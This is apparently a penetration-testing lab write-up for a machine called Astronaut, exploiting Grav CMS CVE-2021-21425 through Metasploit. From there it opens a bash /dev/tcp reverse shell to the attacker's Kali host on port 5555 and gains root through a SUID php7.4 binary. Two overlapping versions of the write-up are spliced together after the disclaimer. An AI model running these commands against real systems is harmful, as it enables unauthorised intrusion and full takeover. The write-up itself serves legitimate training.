Astronaut — Grav CMS → RCE → Root

OSCP-style Lab Write-up
Target: 192.168.168.12
Attacker: Kali Linux
Initial access: www-data
Privilege escalation: SUID /usr/bin/php7.4
Final access: root

⸻

Table of Contents

* 1. Overview
* 2. Enumeration
* 3. Identifying Grav CMS
* 4. Identifying the Vulnerability
* 5. Exploitation with Metasploit
* 6. Dealing with the Unstable Meterpreter Session
* 7. Establishing a Stable Reverse Shell
* 8. TTY Upgrade
* 9. Privilege Escalation Enumeration
* 10. SUID PHP
* 11. Root
* 12. Proof
* 13. Complete Attack Chain
* 14. Lessons Learned

⸻

1. Overview

The target machine was running Grav CMS on an Apache web server.

The intended attack path was:

Grav CMS
    │
    ▼
CVE-2021-21425
    │
    ▼
Remote Command Execution
    │
    ▼
www-data
    │
    ▼
Stable reverse shell
    │
    ▼
SUID enumeration
    │
    ▼
/usr/bin/php7.4
    │
    ▼
EUID 0
    │
    ▼
root
    │
    ▼
/root/proof.txt

The main challenge during exploitation was not obtaining code execution, but keeping the Metasploit Meterpreter session alive.

After several attempts, I decided not to rely on the unstable Meterpreter session. Instead, I used the obtained command execution to establish a second reverse shell directly back to Kali on TCP/5555.

⸻

2. Enumeration

The first step was identifying the available services.

The web server was accessible on port 80.

I checked the HTTP response:

curl -I http://192.168.168.12/

The server identified itself as Apache:

HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)

The target was therefore running an Ubuntu-based Apache web server.

⸻

3. Identifying Grav CMS

The application was located under:

/grav-admin/

I requested the page and searched for application fingerprints:

curl -s http://192.168.168.12/grav-admin/ | grep -iE 'grav|version'

The response contained:

<title>Home | Grav</title>
<meta name="generator" content="GravCMS" />

There were also several Grav-specific paths:

/grav-admin/user/themes/quark/
/grav-admin/user/plugins/
/grav-admin/system/assets/

This confirmed that the target was running Grav CMS.

⸻

Checking the Login Page

The login page was accessible:

/grav-admin/login

I checked it with:

curl -s http://192.168.168.12/grav-admin/login | grep -iE 'grav|version'

The response again confirmed Grav CMS.

⸻

Checking the Admin Interface

The administrative interface was located at:

/grav-admin/admin

I checked the page:

curl -s http://192.168.168.12/grav-admin/admin | grep -i -C 3 'GravAdmin'

The response contained Grav Admin JavaScript:

this.GravAdmin = this.GravAdmin || {};

This confirmed that the Grav administration functionality was present.

⸻

4. Identifying the Vulnerability

The lab description identified the intended vulnerability as:

CVE-2021-21425 — Grav CMS YAML write vulnerability

The vulnerability can be exploited to obtain remote command execution.

A public exploit was also available from Exploit-DB:

https://www.exploit-db.com/exploits/49788

Metasploit also contains a module for the vulnerability:

exploit/linux/http/gravcms_exec

⸻

5. Exploitation with Metasploit

I started Metasploit:

msfconsole

Then searched for the CVE:

search CVE-2021-21425

The relevant module appeared:

exploit/linux/http/gravcms_exec

I loaded it:

use exploit/linux/http/gravcms_exec

Then checked the available options:

show options

⸻

Initial Configuration

The target was:

192.168.168.12

My Kali listener address was:

192.168.45.173

I configured:

set RHOSTS 192.168.168.12
set RPORT 80
set LHOST 192.168.45.173

Initially, the module did not detect the target correctly.

The important discovery was that Grav was installed below:

/grav-admin/

Therefore I configured:

set TARGETURI /grav-admin/

Then:

check

returned:

[+] The target appears to be vulnerable.

⸻

6. Dealing with the Unstable Meterpreter Session

I initially used the default payload:

php/meterpreter/reverse_tcp

The exploit itself worked:

[+] The target appears to be vulnerable.
[*] Sending request to the admin path to generate cookie and token
[+] Cookie and CSRF token successfully extracted !
[*] Implanting payload via scheduler feature
[+] Scheduler successfully created !

However, the Meterpreter session repeatedly died.

Typical output looked like:

[*] Sending stage (72690 bytes) to 192.168.168.12
[-] Meterpreter session 274 is not valid and will be closed

There were many repeated attempts:

Meterpreter session 275 is not valid and will be closed
Meterpreter session 276 is not valid and will be closed
Meterpreter session 277 is not valid and will be closed

Eventually I also received:

[-] Failed to load extension: No response was received to the core_loadlib request.

At this point it was clear that the vulnerability was being successfully exploited, but the Meterpreter payload was not stable on the target.

Instead of repeatedly trying to repair the Meterpreter session, I switched to a command shell.

⸻

7. Establishing a Stable Reverse Shell

The exploit eventually provided a command shell:

[*] Command shell session 294 opened

I immediately verified the privileges:

whoami

Output:

www-data

Then:

id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

The working directory was:

/var/www/html/grav-admin

So the initial foothold was:

www-data

⸻

Why I Used a Second Shell

The Metasploit shell was unstable and eventually closed:

[*] 192.168.168.12 - Command shell session 294 closed.

Rather than repeatedly exploiting the target and waiting for another unstable session, I used the existing command execution to create another reverse shell directly to my Kali machine.

This is an important practical lesson:

If you already have command execution but the framework session is unstable, you do not necessarily need to keep fixing the framework session. Establish an independent shell.

⸻

Start a Listener on Kali

On Kali:

nc -lvnp 5555

The listener was waiting on:

192.168.45.173:5555

From the target shell, I executed:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

This established a second reverse shell.

The important difference was that this shell was no longer dependent on the unstable Meterpreter session.

⸻

8. TTY Upgrade

The initial reverse shell did not provide a proper interactive terminal.

I upgraded it using:

script /dev/null -c /bin/bash

Then verified the terminal:

tty

The result was:

/dev/pts/2

This confirmed that I had a proper pseudo-terminal.

I then verified the current user:

whoami
www-data

And:

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

At this point I had a stable interactive shell as www-data.

⸻

9. Privilege Escalation Enumeration

The next step was local privilege escalation enumeration.

I searched for SUID binaries:

find / -perm -4000 -type f 2>/dev/null

Among the results was:

/usr/bin/php7.4

This immediately stood out.

A PHP interpreter with SUID permissions and owned by root is highly unusual.

⸻

10. SUID PHP

I checked the permissions:

ls -la /usr/bin/php7.4

The result:

-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

The important part is:

-rwsr-xr-x

The s indicates the SUID bit.

The binary is owned by:

root root

Therefore, PHP should execute with root’s effective privileges.

⸻

Verify the Effective UID

Before attempting to spawn a root shell, I verified the behavior:

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

The output was:

UID=33 EUID=0

This was the key finding.

The real UID was still:

33

which corresponds to:

www-data

But the effective UID was:

0

which corresponds to:

root

Therefore the SUID PHP binary was executing with root’s effective privileges.

⸻

11. Root

I used the privileged PHP interpreter to launch Bash:

/usr/bin/php7.4 -r 'system("/bin/bash -p");'

The -p option tells Bash to preserve privileged credentials.

After the shell was spawned, I verified the privileges:

whoami

Output:

root

The prompt became:

root@gravity:/root#

This confirmed successful privilege escalation.

⸻

12. Proof

The root directory contained:

flag1.txt
proof.txt
snap

The lab’s root proof was:

/root/proof.txt

I read it with:

cat /root/proof.txt

This confirmed root-level access.

The flag1.txt value is intentionally omitted from this write-up.

⸻

13. Complete Attack Chain

The complete exploitation path was:

                    ┌──────────────────────┐
                    │  192.168.168.12:80   │
                    │      Apache           │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │     Grav CMS         │
                    │    /grav-admin/      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   CVE-2021-21425     │
                    │    YAML write RCE    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │      www-data        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Stable reverse shell │
                    │     TCP/5555         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   SUID enumeration   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ /usr/bin/php7.4      │
                    │     SUID root        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │     UID=33           │
                    │     EUID=0           │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │       bash -p        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │         ROOT         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   /root/proof.txt    │
                    └──────────────────────┘

⸻

14. Lessons Learned

14.1 Always identify the correct application path

The Grav installation was not running at /.

It was located at:

/grav-admin/

The Metasploit module initially failed until the correct target URI was configured:

set TARGETURI /grav-admin/

This was a good reminder that exploit modules often assume the application is installed at the web root.

⸻

14.2 Exploit success and session stability are two different things

The first Meterpreter attempts repeatedly failed.

For example:

Meterpreter session is not valid and will be closed

and:

Failed to load extension: No response was received to the core_loadlib request.

This did not necessarily mean that the underlying exploit was broken.

The Grav scheduler was successfully executing the payload.

Switching to a command shell demonstrated that command execution was working.

⸻

14.3 A second reverse shell can be a practical solution

After obtaining command execution through Metasploit, I created a second reverse shell to Kali on TCP/5555.

This allowed me to continue working even after the original Metasploit session died.

The workflow was:

Metasploit
    │
    ▼
Grav RCE
    │
    ▼
www-data shell
    │
    ▼
Reverse shell → Kali:5555
    │
    ▼
Stable TTY

This was much more reliable than repeatedly waiting for the Meterpreter session to reconnect.

⸻

14.4 Always enumerate SUID binaries

The following command was critical:

find / -perm -4000 -type f 2>/dev/null

It revealed:

/usr/bin/php7.4

The unusual SUID permission was the intended privilege escalation vector.

⸻

14.5 Verify the effective UID

Rather than immediately assuming the SUID PHP binary would provide root, I verified it:

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

Result:

UID=33 EUID=0

This provided clear evidence that PHP was executing with root’s effective privileges.

⸻

15. Command Cheat Sheet

Grav enumeration

curl -s http://192.168.168.12/grav-admin/ | grep -iE 'grav|version'
curl -s http://192.168.168.12/grav-admin/login | grep -iE 'grav|version'
curl -I http://192.168.168.12/grav-admin/

⸻

Metasploit

msfconsole
search CVE-2021-21425
use exploit/linux/http/gravcms_exec
set RHOSTS 192.168.168.12
set RPORT 80
set TARGETURI /grav-admin/
set LHOST 192.168.45.173
check
run

⸻

Initial shell

whoami
id
pwd

⸻

Second reverse shell

Kali:

nc -lvnp 5555

Target:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

⸻

TTY upgrade

script /dev/null -c /bin/bash
tty

Expected:

/dev/pts/2

⸻

SUID enumeration

find / -perm -4000 -type f 2>/dev/null

⸻

SUID PHP

ls -la /usr/bin/php7.4
/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

Expected:

UID=33 EUID=0

⸻

Root shell

/usr/bin/php7.4 -r 'system("/bin/bash -p");'

Verify:

whoami
id

⸻

Root proof

cat /root/proof.txt

⸻

Conclusion

Astronaut was compromised through a classic web-application-to-local-privilege-escalation chain.

The initial foothold came from Grav CMS CVE-2021-21425, which provided remote command execution as www-data.

The Meterpreter payload was unreliable, so rather than repeatedly troubleshooting the framework session, I used the existing command execution to establish a second reverse shell on TCP/5555 and upgraded it to a proper TTY.

Local enumeration then revealed a root-owned SUID PHP interpreter:

-rwsr-xr-x 1 root root /usr/bin/php7.4

Testing it confirmed:

UID=33 EUID=0

Finally, the SUID PHP binary was used to launch a privileged Bash shell:

/usr/bin/php7.4 -r 'system("/bin/bash -p");'

This resulted in:

root@gravity:/root#

The root proof was then obtained from:

/root/proof.txt

Final attack path:

Grav CMS
→ CVE-2021-21425
→ RCE
→ www-data
→ reverse shell :5555
→ stable TTY
→ SUID enumeration
→ SUID PHP 7.4
→ EUID 0
→ bash -p
→ root
→ proof.txt

⸻

Disclaimer

This write-up is intended for authorized cybersecurity training environments, CTFs, and penetration-testing labs. The techniques described here should only be used against systems for which you have explicit authorization.        │
        ▼
Second Reverse Shell → Kali:5555
        │
        ▼
Stable TTY
        │
        ▼
SUID Enumeration
        │
        ▼
/usr/bin/php7.4
        │
        ▼
SUID PHP → EUID 0
        │
        ▼
Root
        │
        ▼
/root/proof.txt

⸻

1. Reconnaissance

I started with a basic Nmap scan to identify open ports and running services.

nmap -sC -sV -oN nmap.txt 192.168.168.12

The important result was an HTTP service running on port 80.

The web server identified itself as Apache running on Ubuntu.

80/tcp open  http    Apache httpd 2.4.41

Since HTTP was available, I proceeded with web enumeration.

⸻

2. Web Enumeration

I opened the website with curl:

curl -i http://192.168.168.12/

The application was accessible through:

/grav-admin/

I queried the directory:

curl -s http://192.168.168.12/grav-admin/

The response contained several indicators that the application was running Grav CMS.

For example:

<title>Home | Grav</title>
<meta name="generator" content="GravCMS" />

There were also references to Grav-specific directories:

/grav-admin/user/themes/quark/
/grav-admin/user/plugins/
/grav-admin/system/assets/

This confirmed that the target was running Grav CMS.

⸻

3. Grav CMS Administration Panel

I checked the login page:

curl -s http://192.168.168.12/grav-admin/login

The response confirmed the Grav login functionality:

<title>Login | Grav</title>

I also checked the /admin path:

curl -s http://192.168.168.12/grav-admin/admin

This returned:

Grav Admin Login

Therefore, the application structure appeared to be:

http://192.168.168.12/grav-admin/
http://192.168.168.12/grav-admin/login
http://192.168.168.12/grav-admin/admin

⸻

4. Attempting to Identify the Grav Version

I initially attempted to extract a version number from the HTML:

curl -s http://192.168.168.12/grav-admin/admin | grep -oE '[0-9]+\.[0-9]+\.[0-9]+'

This produced various numbers from JavaScript and other resources, for example:

13.805.55
11.054.843
5.722.055
...

These were clearly not reliable Grav version numbers.

I also attempted to retrieve composer.json:

curl -i http://192.168.168.12/grav-admin/composer.json

The server returned:

HTTP/1.1 403 Forbidden

Therefore, the version could not be reliably identified from these methods.

At this point, I moved to vulnerability research based on the identified application.

⸻

5. Identifying the Vulnerability

Searching for known Grav CMS vulnerabilities revealed:

CVE-2021-21425 — Grav CMS YAML Write Vulnerability

The vulnerability allows an attacker to write YAML configuration through the Grav administrative functionality and ultimately achieve remote code execution.

I also found the corresponding exploit on Exploit-DB:

https://www.exploit-db.com/exploits/49788

The exploit was also available through Metasploit.

I searched for the CVE:

msfconsole

Then:

search CVE-2021-21425

Metasploit returned:

Matching Modules
================
exploit/linux/http/gravcms_exec

I selected the module:

use exploit/linux/http/gravcms_exec

⸻

6. Configuring the Metasploit Exploit

I first checked the module options:

show options

The important options were:

RHOSTS
RPORT
TARGETURI
LHOST
LPORT

I configured the target:

set RHOSTS 192.168.168.12

My Kali Linux IP address was:

192.168.45.173

Therefore:

set LHOST 192.168.45.173

The default target URI initially did not work.

When I ran the exploit with:

run

Metasploit reported:

The target is not vulnerable

I also tried forcing exploitation:

set ForceExploit true

However, the exploit then failed while attempting to obtain the Grav cookie and CSRF token:

The server sent a response, but cookie and token was not found.

This suggested that the application was not installed at the root web path.

The earlier enumeration had already shown that Grav was installed under:

/grav-admin/

Therefore, I changed the target URI.

set TARGETURI /grav-admin/

I then verified the target:

check

Metasploit returned:

[+] The target appears to be vulnerable.

This was the important breakthrough.

⸻

7. Exploiting CVE-2021-21425

I executed:

run

Metasploit successfully obtained the required session information:

[*] Sending request to the admin path to generate cookie and token
[+] Cookie and CSRF token successfully extracted !

It then used the scheduler functionality:

[*] Implanting payload via scheduler feature
[+] Scheduler successfully created ! Wait up to 93 seconds

The vulnerability was successfully exploited and command execution was achieved as the web server user.

⸻

8. Meterpreter Session Problems

Initially, I attempted to use the default PHP Meterpreter payload.

However, the resulting sessions were unstable.

I repeatedly received messages similar to:

Meterpreter session ... closed.

and:

Failed to load extension: No response was received to the core_loadlib request.

The session would sometimes open and immediately terminate.

For example:

[*] Sending stage (72690 bytes) to 192.168.168.12
[-] Meterpreter session ... is not valid and will be closed

I also tried running the exploit multiple times, but the problem persisted.

Instead of continuing to rely on the unstable Meterpreter session, I decided to establish a second shell directly from the compromised host.

This is an important practical lesson: an unstable Meterpreter session does not necessarily mean that exploitation failed.

The underlying command execution was working.

⸻

9. Obtaining a Second Reverse Shell

I configured a listener on Kali Linux.

nc -lvnp 5555

From the initial shell on the target, I executed a Bash reverse shell back to my Kali machine:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

The connection was received by my listener.

I now had a separate shell:

www-data@gravity:~/html/grav-admin$

I verified the current user:

whoami

Output:

www-data

I then checked the account:

id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

At this point, the initial compromise was complete.

⸻

10. Stabilizing the Shell

The reverse shell was functional, but I wanted a proper interactive TTY.

I used:

script /dev/null -c /bin/bash

Then checked the terminal:

tty

The result was:

/dev/pts/2

I also verified the shell again:

whoami
www-data

And:

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

This gave me a much more usable shell for further enumeration.

⸻

11. Privilege Escalation Enumeration

With a stable shell as www-data, I began looking for privilege escalation vectors.

A standard first check is SUID binaries.

I ran:

find / -perm -4000 -type f 2>/dev/null

The output contained many normal SUID binaries such as:

/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn

However, one entry immediately stood out:

/usr/bin/php7.4

A PHP interpreter normally should not have the SUID bit set.

⸻

12. Inspecting the SUID PHP Binary

I checked the permissions:

ls -la /usr/bin/php7.4

The result was:

-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

The important part is:

-rwsr-xr-x
   ^
   S

The s in the owner’s execute position means that the SUID bit is enabled.

The binary is owned by:

root root

Therefore, when executed, PHP has an effective UID of root.

⸻

13. Verifying the Effective UID

Before attempting privilege escalation, I verified the actual UID values.

I ran:

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

The result was:

UID=33 EUID=0

This was the critical finding.

The real UID was still:

33

which corresponds to:

www-data

But the effective UID was:

0

which corresponds to:

root

This confirmed that the SUID PHP binary was executing with root privileges.

⸻

14. Exploiting SUID PHP

Since PHP was running with an effective UID of root, it could be used to execute commands with elevated privileges.

A simple approach is to invoke Bash with privilege preservation:

/usr/bin/php7.4 -r 'system("/bin/bash -p");'

Depending on the PHP/build/environment, spawning Bash through system() may not preserve the effective privileges as expected.

A cleaner approach is to replace the PHP process directly with Bash using PHP’s process execution functionality:

/usr/bin/php7.4 -r 'pcntl_exec("/bin/bash", ["-p"]);'

After obtaining the shell, I verified the privileges:

whoami

Expected:

root

And:

id

Expected:

uid=0(root) gid=0(root) groups=0(root)

The privilege escalation was successful.

⸻

15. Root Access

I confirmed that the current user was root:

whoami
root

Then:

id
uid=0(root) gid=0(root) groups=0(root)

I moved into the root user’s home directory:

cd /root

and listed the contents:

ls -la

The machine’s root proof was stored in:

/root/proof.txt

I verified access with:

cat /root/proof.txt

The contents of the proof file are intentionally not included in this write-up.

⸻

16. Complete Exploitation Summary

The complete attack chain was:

Step 1 — Discover the web service

nmap -sC -sV 192.168.168.12

Step 2 — Discover Grav CMS

curl -s http://192.168.168.12/grav-admin/

Identify:

GravCMS

Step 3 — Identify the vulnerable version/application

Research:

CVE-2021-21425

Step 4 — Load the Metasploit module

msfconsole
search CVE-2021-21425
use exploit/linux/http/gravcms_exec

Step 5 — Configure the target

set RHOSTS 192.168.168.12
set LHOST 192.168.45.173
set TARGETURI /grav-admin/

Step 6 — Verify the vulnerability

check

Expected:

[+] The target appears to be vulnerable.

Step 7 — Exploit

run

This resulted in command execution as:

www-data

Step 8 — Establish a second reverse shell

On Kali:

nc -lvnp 5555

From the target:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

Step 9 — Stabilize the shell

script /dev/null -c /bin/bash

Verify:

tty
whoami
id

Step 10 — Enumerate SUID binaries

find / -perm -4000 -type f 2>/dev/null

Identify:

/usr/bin/php7.4

Step 11 — Verify SUID PHP

ls -la /usr/bin/php7.4

Result:

-rwsr-xr-x 1 root root ... /usr/bin/php7.4

Step 12 — Confirm EUID 0

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

Result:

UID=33 EUID=0

Step 13 — Obtain root

/usr/bin/php7.4 -r 'pcntl_exec("/bin/bash", ["-p"]);'

Verify:

whoami
id

Result:

root
uid=0(root) gid=0(root) groups=0(root)

Step 14 — Access the root proof

cd /root
cat proof.txt

⸻

17. Lessons Learned

This machine demonstrates several important penetration-testing techniques.

Web enumeration

The application did not immediately expose its exact version, but identifying Grav CMS was enough to begin vulnerability research.

Correct target path matters

The Metasploit module initially failed because it expected Grav at:

/

The actual installation was located at:

/grav-admin/

Changing:

set TARGETURI /grav-admin/

allowed the vulnerability check and exploitation to succeed.

Don’t confuse exploit failure with session failure

The Meterpreter sessions repeatedly died, but the underlying exploit was working.

Instead of repeatedly trying the same unstable payload, I used the obtained command execution to establish another reverse shell.

SUID enumeration is important

The command:

find / -perm -4000 -type f 2>/dev/null

revealed the unusual SUID PHP binary:

/usr/bin/php7.4

UID vs EUID

The following output was the key indicator:

UID=33 EUID=0

The real user was still www-data, but the effective user was root.

That meant the SUID PHP interpreter could be leveraged for privilege escalation.

⸻

Conclusion

Astronaut was compromised through a vulnerable Grav CMS installation.

The initial foothold was obtained by exploiting CVE-2021-21425, resulting in command execution as www-data.

The initial Metasploit Meterpreter sessions were unstable, so I established a second reverse shell on port 5555 and converted it into a usable TTY.

Privilege escalation was then achieved by discovering an incorrectly configured SUID PHP 7.4 binary:

/usr/bin/php7.4

The SUID configuration caused PHP to execute with:

EUID=0

which ultimately allowed a root shell to be obtained.

Final privilege level:

root

Root proof:

/root/proof.txt




Attack chain:

Grav CMS
    ↓
CVE-2021-21425
    ↓
Remote Code Execution
    ↓
www-data
    ↓
Reverse Shell :5555
    ↓
Stable TTY
    ↓
SUID Enumeration
    ↓
SUID PHP 7.4
    ↓
EUID 0
    ↓
root
